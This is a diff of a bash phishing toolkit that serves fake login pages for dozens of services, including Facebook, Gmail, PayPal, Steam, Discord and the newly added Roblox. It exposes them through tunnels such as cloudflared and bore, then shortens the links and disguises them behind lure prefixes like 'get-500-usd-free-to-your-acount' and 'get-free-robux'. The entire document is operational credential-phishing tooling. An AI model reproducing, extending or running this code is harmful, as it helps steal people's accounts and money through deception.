+	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io|serveo.net|bore.pub|pinggy.link|pinggy.online|pinggy.io) ]]; then
+		if [[ $(site_stat $isgd) == 2* ]]; then
+			shorten $isgd "$url"
+		elif [[ $(site_stat $shortcode) == 2* ]]; then
+			shorten $shortcode "$url"
+		else
+			shorten $tinyurl "$url"
+		fi
+
+		url="https://$url"
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
+		# echo "[!] No url provided / Regex Not Matched"
+		url="Check internet connection. Try Cloudflared if LocalXpose fails"
+		processed_url="Unable to Short URL"
+	fi
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
@@ -486,19 +904,19 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='https://blue-verified-badge-for-facebook-free'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		3 | 03)
 			website="fb_security"
-			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			mask='https://make-your-facebook-secured-and-free-from-hackers'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
-			mask='http://get-messenger-premium-features-free'
+			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -522,19 +940,19 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='http://get-unlimited-followers-for-instagram'
+			mask='https://get-unlimited-followers-for-instagram'
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
-			mask='http://get-unlimited-followers-for-instagram'
+			mask='https://get-unlimited-followers-for-instagram'
 			tunnel_menu;;
 		3 | 03)
 			website="insta_followers"
-			mask='http://get-1000-followers-for-instagram'
+			mask='https://get-1000-followers-for-instagram'
 			tunnel_menu;;
 		4 | 04)
 			website="ig_verify"
-			mask='http://blue-badge-verify-for-instagram-free'
+			mask='https://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -557,15 +975,15 @@ site_gmail() {
 	case $REPLY in 
 		1 | 01)
 			website="google"
-			mask='http://get-unlimited-google-drive-free'
+			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;		
 		2 | 02)
 			website="google_new"
-			mask='http://get-unlimited-google-drive-free'
+			mask='https://get-unlimited-google-drive-free'
 			tunnel_menu;;
 		3 | 03)
 			website="google_poll"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -587,11 +1005,11 @@ site_vk() {
 	case $REPLY in 
 		1 | 01)
 			website="vk"
-			mask='http://vk-premium-real-method-2020'
+			mask='https://vk-premium-real-method-2020'
 			tunnel_menu;;
 		2 | 02)
 			website="vk_poll"
-			mask='http://vote-for-the-best-social-media'
+			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -616,7 +1034,7 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -633,125 +1051,128 @@ main_menu() {
 			site_gmail;;
 		4 | 04)
 			website="microsoft"
-			mask='http://unlimited-onedrive-space-for-free'
+			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
 		5 | 05)
 			website="netflix"
-			mask='http://upgrade-your-netflix-plan-free'
+			mask='https://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
 		6 | 06)
 			website="paypal"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		7 | 07)
 			website="steam"
-			mask='http://steam-500-usd-gift-card-free'
+			mask='https://steam-500-usd-gift-card-free'
 			tunnel_menu;;
 		8 | 08)
 			website="twitter"
-			mask='http://get-blue-badge-on-twitter-free'
+			mask='https://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
 		9 | 09)
 			website="playstation"
-			mask='http://playstation-500-usd-gift-card-free'
+			mask='https://playstation-500-usd-gift-card-free'
 			tunnel_menu;;
 		10)
 			website="tiktok"
-			mask='http://tiktok-free-liker'
+			mask='https://tiktok-free-liker'
 			tunnel_menu;;
 		11)
 			website="twitch"
-			mask='http://unlimited-twitch-tv-user-for-free'
+			mask='https://unlimited-twitch-tv-user-for-free'
 			tunnel_menu;;
 		12)
 			website="pinterest"
-			mask='http://get-a-premium-plan-for-pinterest-free'
+			mask='https://get-a-premium-plan-for-pinterest-free'
 			tunnel_menu;;
 		13)
 			website="snapchat"
-			mask='http://view-locked-snapchat-accounts-secretly'
+			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
 		14)
 			website="linkedin"
-			mask='http://get-a-premium-plan-for-linkedin-free'
+			mask='https://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
 		15)
 			website="ebay"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		16)
 			website="quora"
-			mask='http://quora-premium-for-free'
+			mask='https://quora-premium-for-free'
 			tunnel_menu;;
 		17)
 			website="protonmail"
-			mask='http://protonmail-pro-basics-for-free'
+			mask='https://protonmail-pro-basics-for-free'
 			tunnel_menu;;
 		18)
 			website="spotify"
-			mask='http://convert-your-account-to-spotify-premium'
+			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
 		19)
 			website="reddit"
-			mask='http://reddit-official-verified-member-badge'
 			tunnel_menu;;
 		20)
 			website="adobe"
-			mask='http://get-adobe-lifetime-pro-membership-free'
+			mask='https://get-adobe-lifetime-pro-membership-free'
 			tunnel_menu;;
 		21)
 			website="deviantart"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		22)
 			website="badoo"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		23)
 			website="origin"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		24)
 			website="dropbox"
-			mask='http://get-1TB-cloud-storage-free'
+			mask='https://get-1TB-cloud-storage-free'
 			tunnel_menu;;
 		25)
 			website="yahoo"
-			mask='http://grab-mail-from-anyother-yahoo-account-free'
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
 			tunnel_menu;;
 		26)
 			website="wordpress"
-			mask='http://unlimited-wordpress-traffic-free'
+			mask='https://unlimited-wordpress-traffic-free'
 			tunnel_menu;;
 		27)
 			website="yandex"
-			mask='http://grab-mail-from-anyother-yandex-account-free'
+			mask='https://grab-mail-from-anyother-yandex-account-free'
 			tunnel_menu;;
 		28)
 			website="stackoverflow"
-			mask='http://get-stackoverflow-lifetime-pro-membership-free'
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
 			tunnel_menu;;
 		29)
 			site_vk;;
 		30)
 			website="xbox"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		31)
 			website="mediafire"
-			mask='http://get-1TB-on-mediafire-free'
+			mask='https://get-1TB-on-mediafire-free'
 			tunnel_menu;;
 		32)
 			website="gitlab"
-			mask='http://get-1k-followers-on-gitlab-free'
+			mask='https://get-1k-followers-on-gitlab-free'
 			tunnel_menu;;
 		33)
 			website="github"
-			mask='http://get-1k-followers-on-github-free'
+			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
 		34)
 			website="discord"
-			mask='http://get-discord-nitro-free'
+			mask='https://get-discord-nitro-free'
+			tunnel_menu;;
+		35)
+			website="roblox"
+			mask='https://get-free-robux'
 			tunnel_menu;;
 		99)
 			about;;
@@ -767,7 +1188,8 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
-install_ngrok
+check_status
 install_cloudflared
 install_localxpose
+install_bore
 main_menu
